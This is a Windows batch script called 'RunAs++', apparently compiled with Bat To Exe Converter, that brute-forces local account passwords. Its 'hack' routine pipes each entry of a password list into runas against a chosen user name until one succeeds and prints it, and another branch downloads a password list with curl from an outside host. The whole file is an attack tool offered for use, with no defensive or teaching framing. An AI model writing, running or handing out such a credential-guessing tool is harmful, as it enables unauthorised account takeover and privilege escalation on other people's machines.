::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyEQ/JB9RXjiAPX+GFKAS6fuwpNaAp1lQRPUzcZzPug==
::fBE1pAF6MU+EWH3eyEQ/JB9RXjiAPX+GFKAS6fuwpNaXtUEUR/ZxbJfPug==
::fBE1pAF6MU+EWH3eyEQ/JB9RXjiAPX+GFKAS6fuwpNaKp0MIGvYnbO8=
::fBE1pAF6MU+EWH3eyEQ/JB9RXjiAPX+GFKAS6fuwpNaVt0McR6l0No3aztQ=
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQICPRV1X0/JXA==
::eg0/rx1wNQPfEVWB+kM9LVsJDBaXMmqpTf5S7fD+jw==
::fBEirQZwNQPfEVWB+kM9LVsJDBaXMmqpTf5S7fD+jw==
::cRolqwZ3JBvQF1fEqQICPRV1X0/JfCb6A60Z6/3v6qqGsl0OFOMsOI7V1aCGJfJT/1bhZ/Y=
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJF+L+EY1OidWTRC+Ln60B6ZXo9Tp+uSGsQZWB7BxfZfeug==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cd %~dp0
title RunAs++
chcp 65001 > nul
setlocal EnableDelayedExpansion

:begin
cls
type menu.txt

choice /c gdre /m "Select Command"

if %errorlevel% equ 1 (
	goto get-pwlist
) else if %errorlevel% equ 2 (
    goto pwlist-dl
) else if %errorlevel% equ 3 (
	goto hack
) else if %errorlevel% equ 4 (
	exit
)

:get-pwlist
echo Generating passwords list...
cd get-pwlist
cscript /nologo get-pwlist.js 10000 1 100 ..\pwlist.txt
cd ..
echo OK
pause > nul
goto begin

:hack
set /p "user=User Name: "
set /p "program=Program to Execute: "

for /f %%i in (pwlist.txt) do (
	echo %%i | runas /user:!user! !program! > nul
	if !errorlevel! equ 0 (
		echo Password Found^!
        echo Password^: %%i
		pause > nul
		goto begin
	) else (
        echo Trying password^: %%i ^[FAILED^]
    )
)

:pwlist-dl
del pwlist.txt
curl "http://f0615718.xsph.ru/ProgramData/pwlist.txt" -o pwlist.txt
if %errorlevel% neq 0 (
    echo CURL not found using PowerShell + WGET...
    
)
goto begin